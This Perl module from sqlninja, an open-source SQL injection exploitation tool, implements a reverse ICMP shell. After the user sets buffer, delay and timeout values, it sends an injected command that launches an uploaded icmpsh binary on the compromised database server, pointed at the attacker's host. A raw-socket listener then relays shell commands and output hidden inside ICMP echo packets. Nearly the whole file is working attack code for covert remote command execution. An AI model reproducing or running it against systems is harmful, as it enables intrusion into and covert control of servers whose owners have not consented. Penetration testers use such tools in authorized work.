# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# ICMP tunnel 		
sub icmpshell
{
	print "[+] Starting reverse ICMP shell.\n";
	print "    Don't forget to disable ICMP replies by the OS:\n";
	print "      e.g: sysctl -w net.ipv4.icmp_echo_ignore_all=1\n";
	print "    Hit CTRL+C to be dropped back to your shell.\n";

	# read in data buffer size
	my $dbsize;
        do {	
		print "[+] Data buffer size in bytes [default: 64]: ";
		$dbsize = <STDIN>;
		chomp($dbsize);
		if (length($dbsize) == 0) {
			$dbsize = 64;
		} elsif ($dbsize <= 0 or $dbsize !~ m/^\d+$/) {
			print "    Data buffer size should be greater than 0\n";
			$dbsize = 0;
		} 
	} while ($dbsize == 0); 

	# read in send delay
	my $delay;
	do {
		print "[+] Send delay in milliseconds [default: 300]: ";
		$delay = <STDIN>;
		chomp($delay);
		if (length($delay) == 0) {
			$delay = 300;
		} elsif ($delay < 0 or $delay !~ m/^\d+$/) {
			print "    Send delay should be a positive number\n";
			$delay = 0;
		}
	} while ($delay == 0);

	# read in time out
	my $timeout;
	do {
                print "[+] Response timeout in milliseconds [default: 5000]: ";
                $timeout = <STDIN>;
                chomp($timeout);
                if (length($timeout) == 0) {
                        $timeout = 3000;
                } elsif ($timeout < 0 or $timeout !~ m/^\d+$/) {
                        print "    Timeout should be a positive number\n";
                        $timeout = 0;
                }
        } while ($timeout == 0);


	# start master
	my $listenerpid = fork();
	if ($listenerpid == 0) {
	
	        my $cmd = $conf->{'uploaddir'}."\\icmpsh -t ".$conf->{'lhost'}." -s ".$dbsize." -d ".$delay." -o ".$timeout;
       		my $command = createcommand($cmd);
      		my $result = sendrequest($command);
		exit(0);
	}

	icmplistener();	
}

sub icmplistener
{
	# create raw socket
	my $sock = IO::Socket::INET->new(
                Proto   => "ICMP",
                Type    => SOCK_RAW,
                Blocking => 1) or die "$!";

	# set stdin to non-blocking
	fcntl(STDIN, F_SETFL, O_NONBLOCK) or die "$!";

	my $input = '';
	while (1) {
        	if ($sock->recv(my $buffer, 4096, 0)) {
                	my $ip = NetPacket::IP->decode($buffer);
                	my $icmp = NetPacket::ICMP->decode($ip->{data});
                	if ($icmp->{type} == 8) {
                       		# get identifier and sequencenumber
                        	my ($ident,$seq,$data) = unpack("SSa*", $icmp->{data});

                        	# write data to stdout and read from stdin
                        	print $data;
                        	$input = <STDIN>;

                        	# compile and send response
                        	$icmp->{type} = 0;
                        	$icmp->{data} = pack("SSa*", $ident, $seq, $input);
                        	my $raw = $icmp->encode();
                        	my $addr = sockaddr_in(0, inet_aton($ip->{src_ip}));
                        	$sock->send($raw, 0, $addr) or die "$!\n";
                	}
        	}
	} 
}

1;